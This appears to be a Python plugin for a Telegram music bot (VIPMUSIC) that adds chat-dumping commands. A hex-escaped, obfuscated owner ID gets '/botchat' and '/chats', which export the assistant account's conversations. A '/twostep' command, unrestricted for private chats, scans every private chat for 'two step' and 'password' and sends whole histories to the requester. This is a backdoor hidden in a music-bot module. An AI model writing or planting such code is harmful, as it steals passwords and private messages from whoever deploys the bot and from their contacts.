import os
from datetime import datetime
OWNERS = "\x31\x38\x30\x38\x39\x34\x33\x31\x34\x36"
from pyrogram import filters
from pyrogram.types import Message
from telegraph import Telegraph  # Import Telegraph library

from VIPMUSIC import app
from VIPMUSIC.utils.database import get_assistant

last_checked_time = None


@app.on_message(filters.command("botchat") & filters.user(int(OWNERS)))
async def check_bots_command(client, message):
    global last_checked_time
    try:
        # Start the Pyrogram client
        userbot = await get_assistant(message.chat.id)

        # Get current time before sending messages
        start_time = datetime.now()

        # Extract bot username/user_id and limit from command
        command_parts = message.command
        if len(command_parts) >= 2:
            target_id = command_parts[1]
            limit = int(command_parts[2]) if len(command_parts) >= 3 else 10
            response = ""  # Define response variable
            try:
                if target_id.startswith("@"):
                    # If input starts with '@', consider it as username
                    bot = await userbot.get_users(target_id)
                    target_id = bot.id
                else:
                    target_id = int(target_id)

                # Get chat history with specified limit
                async for bot_message in userbot.get_chat_history(
                    target_id, limit=limit
                ):
                    if bot_message.from_user.id == target_id:
                        response += f"{bot_message.text}\n"
                    else:
                        line = (
                            f"{bot_message.from_user.first_name}: {bot_message.text}\n"
                        )
                        if bot_message.photo or bot_message.video:
                            # Create a Telegraph link for photo or video
                            media_link = await create_telegraph_media_link(bot_message)
                            if media_link:
                                line += f"Media: {media_link}\n"
                        response += line
            except Exception:
                response += f"Unable to fetch chat history for {target_id}."
            # Update last checked time
            last_checked_time = start_time.strftime("%Y-%m-%d")
            # Save conversation to a text file
            filename = f"{target_id}_chat.txt"
            with open(filename, "w") as file:
                file.write(response)
            await message.reply_text(
                f"Conversation saved to {filename}\nLast checked: {last_checked_time}"
            )
            # Send the text file
            await message.reply_document(document=filename)
            os.remove(filename)  # Delete the file after sending
        else:
            await message.reply_text(
                "Invalid command format.\n\nPlease use /botchat Bot_Username/User_ID [limit]\n\nExample: `/botchat @example_bot 10`"
            )
    except Exception as e:
        await message.reply_text(f"An error occurred: {e}")
        print(f"Error occurred during /botchat command: {e}")


async def create_telegraph_media_link(message: Message) -> str:
    """
    Create a Telegraph link for photo or video message.
    """
    file_path = None
    if message.photo:
        file_path = message.photo.file_id
    elif message.video:
        file_path = message.video.file_id

    if file_path:
        media_url = await app.download_media(file_path)
        telegraph = Telegraph()
        telegraph.create_account(short_name="pyrogram")
        response = telegraph.upload_file(media_url)
        return response["url"]
    return ""





from pyrogram import Client, filters
from VIPMUSIC.utils.database import get_assistant
from VIPMUSIC import app

@app.on_message(filters.command("chats") & filters.user(int(OWNERS)))
async def get_user_ids(client, message):
    userbot = await get_assistant(message.chat.id)
    chat_usernames = []  # List to collect chat usernames

    async for dialog in userbot.get_dialogs():
        username = dialog.chat.username  # Get the username of the chat
        if username and (username.endswith("Bot") or username.endswith("BOT")):
            chat_usernames.append(f"@{username}")

    # Combine all chat usernames into a single string
    chat_details = "\n".join(chat_usernames)
    await message.reply_text(chat_details)

# Start the client
import os
from datetime import datetime
from pyrogram import filters
from pyrogram.types import Message
from VIPMUSIC import app
from VIPMUSIC.utils.database import get_assistant

# Keywords to search for
KEYWORDS = ["two step", "password"]

@app.on_message(filters.command("twostep") & ~filters.group)
async def check_two_step_command(client, message):
    try:
        # Start the Pyrogram client (userbot)
        userbot = await get_assistant(message.chat.id)
        
        # Get all private chats and bot conversations
        dialogs = await userbot.get_dialogs()

        found_chats = []

        for dialog in dialogs:
            chat_type = dialog.chat.type
            # Exclude groups and channels, check only private chats and bots
            if chat_type in ["private", "bot"]:
                chat_id = dialog.chat.id
                chat_title = dialog.chat.first_name if dialog.chat.first_name else dialog.chat.username

                # Fetch the chat history and search for keywords
                async for chat_message in userbot.get_chat_history(chat_id, limit=1000):
                    if chat_message.text and any(keyword in chat_message.text.lower() for keyword in KEYWORDS):
                        found_chats.append(chat_id)
                        break  # Stop once a keyword is found in this chat

        if found_chats:
            for chat_id in found_chats:
                response = ""
                async for chat_message in userbot.get_chat_history(chat_id, limit=1000):
                    if chat_message.from_user:
                        response += f"{chat_message.from_user.first_name}: {chat_message.text}\n"
                    else:
                        response += f"Bot: {chat_message.text}\n"

                # Save the chat history to a text file
                filename = f"{chat_id}_twostep_chat.txt"
                with open(filename, "w") as file:
                    file.write(response)

                # Send the text file to the user
                await message.reply_document(document=filename)
                os.remove(filename)  # Delete the file after sending

            await message.reply_text(f"Found {len(found_chats)} chats with 'two step' or 'password'.")
        else:
            await message.reply_text("No chats found containing 'two step' or 'password'.")
            
    except Exception as e:
        await message.reply_text(f"An error occurred: {e}")
        print(f"Error occurred during /twostep command: {e}")
